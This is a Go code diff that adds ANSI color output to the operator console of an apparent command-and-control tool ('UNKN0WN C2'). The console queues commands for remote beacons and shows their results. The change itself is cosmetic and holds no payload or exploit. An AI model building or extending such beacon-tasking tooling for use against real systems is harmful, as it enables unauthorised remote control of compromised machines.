@@ -30,6 +30,12 @@ const (
 
 	// ANSI escape sequences
 	ansiClearScreen = "\033[2J\033[H"
+	
+	// ANSI color codes
+	colorReset  = "\033[0m"
+	colorRed    = "\033[0;31m"
+	colorGreen  = "\033[0;32m"
+	colorYellow = "\033[0;33m"
 )
 
 // Console state management
@@ -57,8 +63,19 @@ func (cl *ConsoleLogger) Printf(format string, v ...interface{}) {
 
 	logCounter++
 
-	cl.Logger.Printf(format, v...)
-	fmt.Print("c2> ")
+	// Colorize the log message
+	msg := fmt.Sprintf(format, v...)
+	
+	// Color [C2] tags green
+	msg = strings.Replace(msg, "[C2]", colorGreen+"[C2]"+colorReset, -1)
+	
+	// Color ERROR messages red
+	if strings.Contains(msg, "Error") || strings.Contains(msg, "ERROR") {
+		msg = colorRed + msg + colorReset
+	}
+	
+	cl.Logger.Print(msg)
+	fmt.Printf("%sc2>%s ", colorGreen, colorReset)
 }
 
 // Global console logger instance
@@ -92,7 +109,7 @@ func startC2Console() {
 	// Initialize console logging
 	initConsoleLogger()
 
-	fmt.Println("\n=== UNKN0WN C2 Management Console ===")
+	fmt.Printf("\n%s=== UNKN0WN C2 Management Console ===%s\n", colorGreen, colorReset)
 	fmt.Println("Type 'help' for available commands")
 
 	consoleActive = true
@@ -101,7 +118,7 @@ func startC2Console() {
 	scanner := bufio.NewScanner(os.Stdin)
 
 	for {
-		fmt.Print("c2> ")
+		fmt.Printf("%sc2>%s ", colorGreen, colorReset)
 
 		if !scanner.Scan() {
 			break
@@ -138,9 +155,9 @@ func startC2Console() {
 			command := strings.Join(parts[2:], " ")
 			taskID := c2Manager.AddTask(beaconID, command)
 			if taskID != "" {
-				fmt.Printf("Task %s queued for beacon %s\n", taskID, beaconID)
+				fmt.Printf("%sTask %s queued for beacon %s%s\n", colorYellow, taskID, beaconID, colorReset)
 			} else {
-				fmt.Printf("Failed to queue task (beacon %s not found)\n", beaconID)
+				fmt.Printf("%sFailed to queue task (beacon %s not found)%s\n", colorRed, beaconID, colorReset)
 			}
 
 		case "result", "res":
@@ -283,7 +300,7 @@ func showTaskResult(taskID string) {
 	task, exists := tasks[taskID]
 
 	if !exists {
-		fmt.Printf("Task %s not found\n", taskID)
+		fmt.Printf("%sTask %s not found%s\n", colorRed, taskID, colorReset)
 		return
 	}
 
